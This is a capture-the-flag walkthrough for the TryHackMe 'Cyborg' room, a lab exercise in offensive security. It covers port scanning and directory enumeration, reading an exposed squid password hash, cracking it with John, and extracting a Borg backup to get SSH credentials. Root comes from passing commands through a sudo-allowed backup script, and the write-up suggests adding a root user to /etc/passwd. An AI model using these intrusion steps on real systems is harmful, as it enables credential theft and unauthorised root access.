---
description: https://tryhackme.com/room/cyborgt8
---

# Cyborg

## Nmap

```bash
sudo nmap 10.10.159.139 -p- -sS -sV

PORT   STATE    SERVICE VERSION

22/tcp open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
53/tcp filtered domain
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Default root page for the web server points to the Apache2 page.

![](<../../../.gitbook/assets/image (454).png>)

We can then use `feroxbuster` to enumerate further directories and files.

```bash
feroxbuster -u <IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

![](<../../../.gitbook/assets/image (2067).png>)

From the results above the /etc/squid/passwd is potentially interesting. Using curl we can read the contents of the file from the terminal.

```bash
curl http://<IP>/etc/squid/passwd
```

Reveals the user and hash combination: `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`

This was then cracked using John against the rockyou.txt wordlist.

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   
```

![](../../../.gitbook/assets/cyborg-John.png)

For now, we can keep a note of the cracked password. Looking again at the feroxbuster results we can browse to `http://<IP>/admin` which shows the web page below.

![](<../../../.gitbook/assets/image (161) (2).png>)

Under the Archive drop down menu there is an opporunity to download a `archive.tar` compressed archive. This archive is extractable without providing a password.

The archive extracts down into the path: `home/field/dev/final_archive/`

Looking through the files `README.txt` gives indication that the archive was created with Borg Backup.

![](<../../../.gitbook/assets/image (132).png>)

The command below will install Borg Backup.

```bash
sudo apt-get install borgbackup
```

Shown below are the commands and linked documentation for listing and extract Borg archives. As shown in the second command the archive can be extract with Borg, where we will be prompted to provide password authentication to decrypt and extract the archive.

```bash
# https://borgbackup.readthedocs.io/en/stable/usage/list.html
borg list ~/Downloads/home/field/dev/final_archive 

# https://borgbackup.readthedocs.io/en/stable/usage/extract.html
borg extract ~/Downloads/home/field/dev/final_archive/::music_archive
```

After entering the cracked password from earlier, the command below can be used to find interesting files within the newly extract archive which appears to represent the user profile for the user alex.

```bash
find ~/Desktop/home -name *.txt 
```

![](<../../../.gitbook/assets/image (68) (2).png>)

The `note.txt` file in Alex's documents reveals a password for his `SSH` login.

![](<../../../.gitbook/assets/image (47) (2).png>)

After successfully logging in with SSH we are able to check what `sudo` permissions Alex has on the target system.

Checking `sudo -l`.

![](<../../../.gitbook/assets/image (51) (2).png>)

Alex has the ability to run `sudo` as any user without providing a password on the bash script `/etc/mp3backups/backup.sh`.

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

There is an opportunity to run commands at the end of the script.

```bash
cmd=$($command)
echo $cmd
```

Running a command after the script using the `-c` parameter allows commands to be executed in the context of root.

{% hint style="info" %}
reading the contents of `/home/alex/.bash_history` also shows where the user alex has used the same methods previously to perform elevated functions with the script.
{% endhint %}

```bash
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
```

![](../../../.gitbook/assets/cyborg\_Pe.png)

This allows for the root flag to be read.

{% hint style="info" %}
For a root shell its possible to use this function to echo in a new root user into /etc/passwd.
{% endhint %}
